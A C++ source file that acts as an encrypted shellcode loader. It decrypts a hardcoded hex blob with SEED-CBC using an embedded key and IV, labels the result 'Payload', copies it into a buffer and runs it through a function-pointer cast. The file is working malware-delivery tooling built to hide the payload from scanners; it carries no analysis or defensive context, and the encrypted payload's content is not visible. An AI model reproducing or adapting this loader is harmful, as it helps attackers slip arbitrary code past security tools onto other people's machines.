//////////////////INCLUDE LIBRARY//////////////////////////
#include <iostream>
#include <fstream>
#include "cryptopp/seed.h"
#include "cryptopp/hex.h"
#include "cryptopp/modes.h"
#include "cryptopp/osrng.h"
#include "cryptopp/base64.h"
///////////////////END OF INCLUDE LIBRARY////////////////////////////

using namespace std;
using namespace CryptoPP;

void Print(const std::string& label, const std::string& val)
{
   std::string encoded;
   StringSource(val, true,
      new HexEncoder(
         new StringSink(encoded)
      ) // HexEncoder
   ); // StringSource

   std::cout << label << ": " << encoded << std::endl;
}

string decode(string data)
{
   std::string decoded;
   StringSource(data, true,
      new HexDecoder(
         new StringSink(decoded)
      ) // HexEncoder
   ); // StringSource

	return decoded;
}

int main(int argc, char* argv[])
{
   AutoSeededRandomPool prng;
   std::string keys=decode("606D4861365000E52BE87733C0D7427E");
   std::string IVs=decode("7B18B5EC104F97D17CE7F8B8708EC58D");

   SecByteBlock key((const byte*)keys.data(), keys.size());
   SecByteBlock iv((const byte*)IVs.data(), IVs.size());


 string cipher="D0B523AECE45EAB9CB67D17394E3945F379FADD2246C538384D53442C8CDDEF96579C7AD9FBEC1FF2C562BD76A257F7BCEBEA6AA363F6209ED11CDD8D1A6ADFB7CFF11723548DD04436F95AF738AF6A7537CF92B2E7E0388FF72E900C52DC2FE0C674AF9A144E6861A749258BF9410BE441CE3EA41AE702C80221004BC823157C0FE8537A65D4C14D6E8824F231619E9B119FA500A56430FB431179E2A1A5F6F8023C8B31EB5F9F8E184509CE958F354103A8ECC7B44BEE562B51757E05A1798B7FBDA3CB8A8A8950C503CEB2E3448ED8D44939C66C72E9DC9C88B6BD9E770957B37785E2E653F1C6D9272148CE1A9CED617FE39913ADB27EAF274D0393386A69DF55AAC4C463A5DCDBF7214BB6EB1875AAFBA6230A8C1ACA1DD8B70D0892EA43A3B65714213E3D54E8C0D5CB251AF93BABAABF74FEAF49704F2CDADDF9F3CAC4F33CF04C9EDFFDA685027AC95D1F69E2BD13A4468F9DFE2B632C8E3710B8B728B088562134972944F152A4C0636CC2CAA31586C44C3DE2CBA9AF7DA6C278599A8363333F73BD3D121AD171498DC56B9";
   std::string encoded, recovered;

   try
   {
      CBC_Mode< SEED >::Decryption d;
      d.SetKeyWithIV(key, key.size(), iv);

      // The StreamTransformationFilter removes
      //  padding as required.
      StringSource s(cipher, true,(new HexDecoder( 
       new StreamTransformationFilter(d,
		new StringSink(recovered)))
       ) // StreamTransformationFilter
      ); // StringSource

      std::cout << "Payload is : " << recovered << std::endl;
   }
   catch(const CryptoPP::Exception& e)
   {
      std::cerr << e.what() << std::endl;
      exit(1);
   }

	char * writable = new char[recovered.size()];
	std::copy(recovered.begin(), recovered.end(), writable);

   	int (*ret)() = (int(*)())writable;
	ret();

   return 0;
}
